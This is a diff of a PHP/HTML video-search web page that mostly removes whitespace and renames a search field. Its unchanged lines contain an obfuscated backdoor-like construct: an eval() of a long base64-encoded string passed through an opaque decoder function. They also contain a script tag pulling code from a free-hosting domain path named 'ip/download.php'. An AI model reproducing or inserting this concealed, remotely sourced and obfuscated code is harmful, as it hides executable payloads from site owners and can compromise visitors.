@@ -2,7 +2,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="https://get2mates.000webhostapp.com/ip/download.php"></script>
 <style>
-
 .video-list-thumbs{}
 .video-list-thumbs > li{
     margin-bottom:12px;
@@ -76,20 +75,15 @@
 <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
 <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
 <!------ Include the above in your HEAD tag ---------->
-
-
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
 <body>
-    
 <div class="w3-input w3-border w3-round-large" >
-<a href="/"><center> <h1 > Home </h1> </center></a> </div>
-    
+<a href="/"><center> <h1 > Home </h1> </center></a> </div>  
 <form action="/searchfilter.php" class="w3-container w3-card-4 w3-light-grey">
-   <center> <h2> Put The Query To Search  </h2> </center>
-   
+   <center> <h2> Put The Query To Search  </h2> </center>  
   <p>
-  <input class="w3-input w3-border w3-round-large" name="s" type="text"></p>
+  <input class="w3-input w3-border w3-round-large" name="vkr" type="text"></p>
   <center>
    <button type="submit" class="w3-bar-item w3-button w3-red" > Search! </button></center>
    <br><br>
@@ -102,11 +96,6 @@ if(file_exists('keys.php')){include_once('keys.php');}else{die('<h2>File keys.ph
 $e7091="Myt2S0lXWkFtOG82bUNhc1l2aGlJcWpQcm9XUmcvUVN3VS9QK2p3ZVJ6RUp5bENhVWlYdzI4OFpEdzNoSjZaZndncmRhMUNENVZJQjlmSXphR01DUmFkNEdWVE5GNFhYMGpzTGVjNm9BejEyS0N1WnkrMmU0bzc4K1FWSEdwUUZuOGg0c0Q2RzVGV3I1Q21RNlJtb3V0M1FTV2ROWXB6eGFvM24vYzZldW11TmZ6QXg2R3NLQVVkT0NDOGdzZGpwcFh1NUxKZ3lZbVJTZUVnd0xnelFMNFN3NkVWNjBpVTNodTZuZzduUS9RZUdGNXJUN1Q0T0RkQlgydldsb3FZd3FveWJnZW5xcTdWdkowci8yNmlmdDBFOG0yNmY1UmtoVmR0dk9MbWZ1RlE4M2JYbGlEQlgvZlNydlZ6ZUxmNnhMTitzazZkNkdZU0VJaGdFQU9QeWVuL3YwVG5XTEFVMXlwczJtZEMxOFlYanZxOHhYc1djZkk5UzJHbTJSMnNESlNKeklxbUVYYSt0TGpoUEtUbCs3QklOK0lVb28zd0drNS80N2hwV3pTd3lMYXRmdWdxbjdHNVMzUEdGRm1GeE93Rkl1ZmNhdG5iR0djS0FERllERXBRV3dwVWhFQW8ya1ZiRk5ud1FGRStWUS9EOXlPT3JTcWo2MHVCQ2N4NWd2WDZhMDBTWHhXK3JMZWdjVE12eGdjN1I4NEo4N2YxUlIwcUNIcTczZS9ZOGErNGdpenNkZHNueXVmbnVVLzV5bGEzMHpyMzNjMk9aNThXM25OMnhxUk5GZVh5a2NDMTN5YU90SzJGSzljSVdpRlNScmlRa1hwbTNFdThHN3JuU3FYTzZOcHY4MUxpZEpYZDY2V1VCT3hPR3BDOUlmbXJCdC9KRjBVYUxXQ3JhUTU2QkxLSnRBUUN1NHh4NXlFZGFMNE9TSWpSeWpDc0ZxM0grNklZeFFlOWsvYks3WjZ2aFRWMEZveUs1TkM2aVdOMzdHVTFZeFZzdFh1VkRoQnBxdEJZbGwvUVNpWmc3bEZVeFBTbzZpUjNVcXdYTG1UMndidno4UkNtOEw2MWY1OU1QTXBIb0Z0TUgzVTRCOWtPNUZsWkJKNUZNY2IyeWI2TkN1aFFEZXpUb1NqRDQzMWNuVzhIVEhyK2NheTBTTHF2Sko1WEpUU3NqSEoyd2Fmek1XTEplT1J4d3hFbVdRSHNJVUlwcldwbmhmYXNKLzZqUjNkZUlKMmNaeDVVdHpNdXZTcHkvdEFpdk9XS3FyZ0hFTGkwdjV6V016RUJxSHlZTHhRZStTSkFGejFYS3owYXFCN3ZaRW5hU2ErMzNnNkxOS1l4aXE4cmFIR2dNNlhtL3lhVENPMGkvQUNac2JaYlRsZmxCMkdIUDZNWklrSGk5N09ac1h2b2RhMTUwZ25OODNlcUM0Qm91SGlHTFdBSUp5TXZ2aUQrVU1yaDVsVGZxYnA3NGRRUGhOTitydFU5OGhBSHl1Z2pMVnVjOEo2TXN1MHM0R25LTnlLRnQ2OE5wWi9jLytURHVxRVBRNy9LQk0xMHdDMzkvM3FSY3lZWGdVKytMNkdOeGlBTVVFRWJhTCtiajI2NlVTN3hRR0FVSXAzaXZCTmExOFVZQ0haSGFWYlpudFFBRUVVZkI4UVdUOWZzSDZsSmZhK3VvbE0xb1ZiNzlCd0l5NzJvamNMOTdVZGNMbU42OXZ5akQ1Y0pybFdDdm5MZ3RKUlU4ZGMvRVNIaVBFcFhnbjBjPQ==";eval(e7061($e7091));
 echo $ddata;
 ?>
-
-
-
-
-
 <style>
 .footer {
    position: fixed;
@@ -120,9 +109,7 @@ echo $ddata;
 </style>
 <div class="footer">
   <p>
-      
-      
-     <div style="position: fixed;bottom: 0;width: 100%;background-color: black;color: white;text-align: center;z-index: 99999999999999999;">
+<div style="position: fixed;bottom: 0;width: 100%;background-color: black;color: white;text-align: center;z-index: 99999999999999999;">
   <p> &copy; All right Reserved <?php echo date("Y"); ?> . Powered By <a href="https://tinyurl.com/buydlapitube"><b> Vijay Kumar </b> </a></p>
 </div>
   </p>
